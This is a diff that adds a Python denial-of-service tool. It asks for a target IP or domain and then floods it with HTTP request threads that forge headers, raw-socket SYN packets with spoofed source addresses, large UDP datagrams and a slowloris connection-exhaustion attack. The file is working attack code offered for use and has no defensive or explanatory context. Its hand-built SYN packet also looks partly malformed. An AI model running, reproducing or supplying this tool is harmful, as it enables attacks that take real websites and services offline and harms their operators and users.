@@ -1,0 +1,76 @@
+import sys, os, time, random, threading, socket, requests, ssl
+from urllib3 import PoolManager, HTTPConnectionPool
+
+target = input("Target IP/Domain: ")
+port = int(input("Port (default 80): ") or 80)
+duration = int(input("Attack duration (seconds): "))
+
+stop_time = time.time() + duration
+
+class HttpFlood(threading.Thread):
+    def run(self):
+        session = requests.Session()
+        headers = {
+            'User-Agent': random.choice(['Mozilla/5.0', 'Googlebot', 'Bingbot']),
+            'Accept': '*/*',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+        }
+        while time.time() < stop_time:
+            try:
+                params = {'_' + str(random.randint(1,999999)): random.randint(1,999999)}
+                session.get(f"http://{target}/?" + "&".join(f"{k}={v}" for k,v in params.items()), headers=headers, timeout=1)
+                session.post(f"http://{target}/upload", data={'x'*random.randint(100,5000): 'y'*10000}, headers=headers, timeout=1)
+            except:
+                pass
+
+def syn_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+    packet = (
+        b'\x45\x00\x00\x28' +  # IP header
+        random.randbytes(20) + 
+        b'\x00\x00\x40\x00\x40\x06\x00\x00' +
+        socket.inet_aton(random.choice(['1.2.3.4','5.6.7.8','9.10.11.12'])) +
+        socket.inet_aton(target) +
+        b'\x00\x50' + port.to_bytes(2,'big') +
+        b'\x00\x00\x00\x01\x00\x00\x00\x00\x50\x02\x20\x00\x00\x00\x00\x00'
+    )
+    while time.time() < stop_time:
+        sock.sendto(packet, (target, port))
+
+def udp_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random.randbytes(65500)
+    while time.time() < stop_time:
+        sock.sendto(data, (target, port))
+
+def slowloris():
+    socks = []
+    for _ in range(500):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {target}\r\n".encode())
+            socks.append(s)
+        except:
+            pass
+    while time.time() < stop_time:
+        for s in socks:
+            try:
+                s.send(f"X-{random.randint(1,999999)}: {random.randint(1,999999)}\r\n".encode())
+            except:
+                socks.remove(s)
+
+for _ in range(500):
+    HttpFlood(daemon=True).start()
+for _ in range(1000):
+    threading.Thread(target=syn_flood, daemon=True).start()
+for _ in range(500):
+    threading.Thread(target=udp_flood, daemon=True).start()
+threading.Thread(target=slowloris, daemon=True).start()
+
+print(f" FLOODING {target}:{port} for {duration} seconds")
+time.sleep(duration)
+print("Attack finished.")
